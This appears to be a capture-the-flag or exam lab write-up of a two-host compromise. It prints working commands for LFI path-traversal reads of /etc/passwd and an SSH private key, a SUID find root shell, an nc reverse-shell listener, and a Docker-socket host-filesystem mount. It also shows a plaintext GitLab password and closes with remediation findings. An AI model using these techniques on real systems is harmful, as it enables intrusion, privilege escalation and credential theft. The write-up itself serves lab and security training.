1. Machine A — 10.10.11.10 (exam-1-lab-1)

This machine exposed SSH, GitLab, an Apache application on port 8000, nginx on 8060, and an additional service on 9094. The successful initial-access path was the port-8000 web application, which accepted a page parameter vulnerable to local file inclusion (LFI).

1.1 Host discovery and full TCP enumeration

nmap -sn 10.10.11.0/24
nmap -sV -sC -O 10.10.11.10 -p- --min-rate 8000 -T5

The discovery scan identified 10.10.11.10. The full scan showed 22/tcp (OpenSSH), 80/tcp (GitLab behind nginx), 8000/tcp (Apache 2.4.62), 8060/tcp (nginx 1.27.1), and 9094/tcp. Port 8000 became the key entry point.

1.2 Web enumeration and LFI confirmation

gobuster dir -u http://10.10.11.10 -w /usr/share/wordlists/dirb/common.txt

Directory enumeration against port 80 was obstructed by GitLab redirect behavior. Attention moved to the Apache application on port 8000. Early path guesses against a non-existent /home/users path returned no useful content.

curl -S http://10.10.11.10:8000/?page=../../../../etc/passwd

Reading /etc/passwd confirmed LFI and disclosed the interactive account user:x:1000:1000:...:/home/user:/bin/bash. This corrected the home-directory path for the SSH key.

1.3 SSH private-key disclosure and login

curl -s http://10.10.11.10:8000/?page=../../../../home/user/.ssh/id_rsa
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@10.10.11.10

The LFI exposed the user's OpenSSH private key. After saving it locally and applying restrictive permissions, key-based SSH authentication succeeded as user.

The user flag was stored directly in /home/user/flag.txt. The same home directory also contained gitlab-credentials.txt.

1.5 Local privilege-escalation enumeration

cat gitlab-credentials.txt
sudo -l
id
find / -perm -4000 -type f 2>/dev/null

The credential file contained GitLab credentials for aliza. The account belonged to the sudo group, but sudo -l required a password. SUID enumeration was therefore decisive: /usr/bin/find appeared in the SUID list.

The shell history also contained the administrator setup action chmod u+s /usr/bin/find, corroborating why the system find binary was privileged. Attempts to set the SUID bit again as the unprivileged user failed and were unnecessary; the binary was already exploitable.

1.6 Root via SUID find — Q28

find . -exec /bin/sh -p \; -quit
cd /root
ls -la
cat flag.txt

The -p option preserved the effective privileged identity when find executed the shell. The prompt changed to #, and /root became readable.

2. Machine B — 10.10.10.10 (exam-1-lab-2)

This machine initially exposed only SSH externally. The supplied evidence shows that the working foothold was obtained through the GitLab/CI relationship discovered on Machine A: the recovered aliza GitLab credentials were used in the exam workflow, and a CI job on Machine B produced a reverse shell as gitlab-runner.

2.1 Host discovery and service enumeration

nmap -sn 10.10.10.0/24
nmap 10.10.10.10 -sC -sV -O -p- --min-rate 8000 -T5

Only 22/tcp was exposed, running OpenSSH 9.2p1 on Debian. A direct password attempt as user did not succeed:

ssh user@10.10.10.10

2.2 Credential pivot and GitLab CI foothold

cat gitlab-credentials.txt
# username: aliza
# password: deviation-overuse-legwarmer

nc -lvnp 4444

The credentials were recovered from Machine A. The terminal evidence then records an inbound connection from 10.10.10.10 to the attacker VPN address 172.27.232.2:4444. The resulting working directory was ~/builds/t1_TXLuqF/0/aliza/shell and contained .gitlab-ci.yml, establishing that code was executing under a GitLab Runner job.

Evidence boundary. The supplied text begins at the listener receiving the shell and does not preserve the exact GitLab web-interface steps or the exact CI YAML payload that triggered it. Those missing actions are intentionally not fabricated here.

2.4 Privilege-escalation discovery: Docker group

sudo -l
find / -perm -4000 -type f 2>/dev/null
docker ps
docker images
docker info 2>/dev/null | head -40
ls -l /var/run/docker.sock

sudo required a password and ordinary SUID enumeration did not provide a useful route. Docker, however, was fully reachable. The socket permissions were root:docker with group read/write access, matching the runner's docker-group membership. This is effectively a host-root-equivalent capability when arbitrary host paths can be mounted into a container.

2.5 Why a local BusyBox image was built

docker pull alpine
docker images

The daemon had no local images and could not reach Docker Hub, so the usual Alpine-based host-mount approach was unavailable. BusyBox already existed on the host, so a minimal image was assembled locally from that binary and its runtime libraries.

2.6 Identify BusyBox and required libraries

which busybox
busybox | head
ldd /bin/busybox

BusyBox was available at /usr/bin/busybox / /bin/busybox. ldd showed dependencies on libresolv.so.2, libc.so.6, and the x86-64 dynamic loader. These files were copied into a minimal root filesystem.

2.7 Build and import the offline image

cd /tmp
mkdir -p rootfs/bin rootfs/lib/x86_64-linux-gnu rootfs/lib64
cp /bin/busybox rootfs/bin/
cp /lib/x86_64-linux-gnu/libresolv.so.2 rootfs/lib/x86_64-linux-gnu/
cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/x86_64-linux-gnu/
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
tar -C rootfs -cf rootfs.tar .
cat rootfs.tar | docker import - busybox-local
docker images

The import created the local image busybox-local:latest. This avoided all external-registry dependency and enabled the Docker-group escalation entirely with files already present on the target.

2.8 Mount the host filesystem and read root flag — Q26

docker run --rm -it -v /:/host:ro busybox-local /bin/busybox sh
/bin/busybox id
/bin/busybox ls -la /host/root
/bin/busybox cat /host/root/flag.txt

The container ran with UID/GID 0 and the host root filesystem was mounted read-only at /host. Because the minimal image did not install BusyBox applet symlinks, commands were invoked explicitly as /bin/busybox <applet>. The host's root-only flag was then readable at /host/root/flag.txt.

3. Complete successful attack chain

Machine A: network scan → Apache application on 8000 → LFI through ?page= → read /etc/passwd → identify user → disclose /home/user/.ssh/id_rsa → SSH → user flag → enumerate SUID files → abuse SUID find → root shell → root flag.

Machine B: Machine-A credential discovery → GitLab/CI pivot → CI reverse shell as gitlab-runner → user flag → identify docker-group membership and writable Docker socket → Docker Hub unavailable → construct local BusyBox image → mount host / at /host → read host root flag.

4. Findings and remediation

  • Finding 1 — Local File Inclusion. User-controlled file paths allowed arbitrary local file reads, including SSH private keys. Remediation: remove direct path inclusion, use strict allowlists/route IDs, canonicalize paths, isolate application permissions, and never expose private keys to the web-service account.
  • Finding 2 — Exposed reusable credentials. GitLab credentials were stored in a user-readable plaintext file. Remediation: use a secrets manager or short-lived tokens, enforce least privilege, and rotate credentials after use.
  • Finding 3 — SUID on /usr/bin/find. A general-purpose command interpreter-capable utility was made SUID root. Remediation: remove the SUID bit and audit the filesystem for unexpected privileged binaries.
  • Finding 4 — GitLab Runner in docker group. The runner could control the host Docker daemon, allowing host filesystem access as container root. Remediation: do not place untrusted CI runners in the host docker group; use isolated runners/VMs, rootless or tightly constrained container execution, and protect the Docker socket.
  • Finding 5 — CI trust boundary. Repository-controlled CI execution reached a runner with host-equivalent Docker privileges. Remediation: protect pipeline configuration, restrict who can run/modify jobs, separate trusted and untrusted runners, and minimize runner host permissions.
